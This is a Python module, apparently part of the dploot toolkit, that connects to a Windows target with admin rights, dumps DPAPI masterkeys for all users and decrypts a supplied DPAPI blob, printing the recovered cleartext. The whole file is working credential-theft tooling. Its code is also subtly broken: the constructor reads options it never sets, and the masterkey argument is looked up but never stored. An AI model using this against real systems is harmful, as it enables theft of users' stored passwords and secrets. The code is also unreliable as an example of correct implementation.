import argparse
import base64
import logging
import os
import sys
from typing import Callable, Tuple

from impacket.dpapi import DPAPI_BLOB

from dploot.action import DPLootAction
from dploot.action.masterkeys import add_user_masterkeys_argument_group
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.utils import dump_looted_files_to_disk, find_guid, find_sha1
from dploot.triage.masterkeys import MasterkeysTriage, Masterkey

NAME = "blob"


class BlobAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user()

        if not self.handle_blob_option(self.options.blob):
            sys.exit(1)
        
        if self.options.masterkey is not None:
            guid, sha1 = self.options.masterkey.split(":")
            self.masterkeys[Masterkey(
                guid=find_guid(guid),
                sha1=find_sha1(sha1),
            )]

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            logging.info("Trying to decrypt DPAPI blob\n")
            DPAPI_BLOB(self.blob).dump()
            masterkey = find_masterkey_for_blob(self.blob, masterkeys=self.masterkeys)
            if masterkey is not None:
                cleartext = decrypt_blob(blob_bytes=self.blob, masterkey=masterkey, entropy=self.options.entropy if self.options.entropy != "" else None)
                print("Data decrypted: %s" % cleartext)
        else:
            logging.info("Not an admin, exiting...")
    
    def handle_blob_option(self, blob_argument):
        if os.path.isfile(blob_argument):
            with open(blob_argument, "rb") as f:
                self.blob = f.read()
            return True
        else:
            try:
                self.blob = base64.b64decode(blob_argument)
                return True
            except Exception:
                logging.error(f"{blob_argument} does not seems to be a file nor a b64 encoded blob.")
        return False

def entry(options: argparse.Namespace) -> None:
    a = BlobAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction, protocol: str) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Decrypt DPAPI blob. Can fetch masterkeys on target"
    )

    group = subparser.add_argument_group("blob options")

    group.add_argument(
        "--blob",
        action="store",
        required=True,
        help=("Blob base64 encoded or in file"),
    )

    group.add_argument(
        "--masterkey",
        action="store",
        help=("{GUID}:SHA1 masterkey"),
    )

    group.add_argument(
        "--entropy",
        action="store",
        help=("Entropy value"),
    )
    
    group.add_argument(
        "--mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_user_masterkeys_argument_group(group)
    DPLootAction.add_general_args(subparser, protocol)

    return NAME, entry
